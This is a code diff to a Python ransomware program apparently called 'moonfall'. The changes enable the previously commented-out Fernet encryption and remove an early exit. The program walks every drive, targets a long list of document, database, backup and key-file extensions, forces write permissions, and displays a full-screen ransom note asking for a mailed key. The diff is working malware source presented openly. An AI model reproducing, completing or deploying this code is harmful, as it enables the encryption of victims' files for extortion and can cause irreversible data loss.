@@ -16,31 +16,24 @@ import win32api
 import subprocess
 import ctypes
 
-brand_name = '.moonfall'
 
-"""Please for further information check https://pastebin.com/xZKU7Ph1"""
+"""
+    General purpose variables
+"""
 
-protected_folders = ['Content.IE5', 'Temporary Internet Files', '\AppData\Local\Temp', '\Program Files (x86)', '\Program Files', '\WINDOWS', '\ProgramData', '\Intel', '$\\', '\Local Settings\Temp', 'Windows', 'ransomware']
 
+brand_name='.moonfall'
+protected_folders = ['Content.IE5', 'Temporary Internet Files', 'AppData', 'Program Files (x86)', 'Program Files', 'ProgramData', 'Intel', '$\\', 'Local Settings', 'Windows', 'ransomware', 'Boot', 'System Volume Information']
 to_avoid_extensions = ['.moonfall', '.dll', '.exe']
-
-target_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst','.ost', '.msg', 
-  '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', 
-  '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg']
-
-target_extensions_2 = ['.docb', '.docm', '.dot','.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', 
-  '.xltx', '.xltm', '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', 
-  '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', 
-  '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', 
-  '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif','.tiff', '.nef', '.psd', '.ai', 
-  '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', 
-  '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', 
-  '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb','.vbs', 
-  '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', 
-  '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', 
-  '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', 
-  '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', 
-  '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']
+target_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst','.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', 
+  '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot','.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot', 
+  '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ',
+  '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif','.tiff', '.nef', '.psd', '.ai', 
+  '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3',
+  '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb','.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp',
+  '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay',
+  '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw',
+  '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']
 
 
 """
@@ -78,6 +71,14 @@ def send_key_by_mail(sender, sender_password, reciever):
 
 
 """
+    Get file extension
+"""
+def getExtension(filename):
+    _filename, file_extension = os.path.splitext(filename)
+    return file_extension
+
+    
+"""
     Generate the key using Fernet module
 """
 def write_key():
@@ -98,8 +99,11 @@ def load_key():
     Save the data checking permissions
 """
 def save_data(filename, data, opt='add_ext'):
-    if os.access(filename, os.W_OK):
-        oschmod.set_mode(filename, "a+rwx,g-w,o-x") #TODO repasar permisos
+    if not os.access(filename, os.W_OK):
+        oschmod.set_mode(filename, "a+rwx,g-w,o-x")
+        if not os.access(filename, os.W_OK):
+            raise PermissionError("Write permissions can't be modified")
+        
     with open(filename, 'wb') as file:
         file.write(data)
 
@@ -117,9 +121,11 @@ def save_data(filename, data, opt='add_ext'):
 def load_data(filename):
     if not os.access(filename, os.R_OK):
         oschmod.set_mode(filename, "a+rwx,g-w,o-x")
+        if not os.access(filename, os.R_OK):
+            raise PermissionError("Read permisions can't be modified")
+        
     with open(filename, 'rb') as file:
         return file.read()
-
 
 """
     Function to encrypt or decrypt the data using the key
@@ -129,7 +135,7 @@ def encrypt_or_decrypt(filename, key, opt='encrypt'):
         f = Fernet(key)
         data = load_data(filename)
         if opt == 'encrypt':
-            # encrypted_data = f.encrypt(data)
+            encrypted_data = f.encrypt(data)
             save_data(filename, encrypted_data)
         elif opt == 'decrypt':
             decrypted_data = f.decrypt(data)
@@ -144,6 +150,12 @@ def encrypt_or_decrypt(filename, key, opt='encrypt'):
             raise Exception('Wrong key')
         else:
             print(ve)
+            
+    except IOError as ioe:
+        print(ioe)
+        
+    except PermissionError as pe:
+        print(pe)
 
 
 
@@ -156,21 +168,18 @@ if __name__ == '__main__':
 
     local_drives = win32api.GetLogicalDriveStrings() # Cheking drives connected
     local_drives = local_drives.split('\000')[:-1]
-
-    """
-    root_osx = '/Users/marcosplazagonzalez/Desktop/test'
-    root_win = 'C:/Users/marco/OneDrive/Escritorio/test'
-    root_vm_win = 'C:/Users/IEUser/test/'
-    """
     
-    # Iterative algorithm TODO Inefficient
+    # Iterative algorithm TODO Inefficient O(n^3)
     for ld in local_drives:
         for root, dirs, files in os.walk(ld):
             [dirs.remove(d) for d in list(dirs) if d in protected_folders]
             for fn in files:
                 full_path = root + os.sep + fn
-                encrypt_or_decrypt(full_path, key)
-    sys.exit()
+                ext=getExtension(full_path)
+                if ext in target_extensions and ext not in to_avoid_extensions:
+                    print(full_path)
+                    encrypt_or_decrypt(full_path, key)
+
     # Show Ransom note
     sg.theme('DarkRed2')
     layout = [	[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
@@ -188,11 +197,10 @@ if __name__ == '__main__':
                [sg.Text(
                    'Introduce the key that we have sent to you, to recover your files here', font='Helvetica 13')],
                [sg.InputText()],
-                              [sg.Text('')],
+               [sg.Text('')],
                [sg.Button('Decrypt files')]]
 
-    window = sg.Window('Title', layout, no_titlebar=True,
-                       keep_on_top=True, element_justification='c')
+    window = sg.Window('Title', layout, no_titlebar=True, keep_on_top=True, element_justification='c')
 
     count = 0
 
@@ -208,8 +216,10 @@ if __name__ == '__main__':
                     for fn in files:
                         full_path = root + os.sep + fn
                         try:
-                            # encrypt_or_decrypt(full_path, key, opt='decrypt')
-                            count += 1
+                            ext=getExtension(full_path)
+                            if ext == brand_name:
+                                encrypt_or_decrypt(full_path, key, opt='decrypt')
+                                count += 1
                         except Exception as e:
                             print(e)
                             break
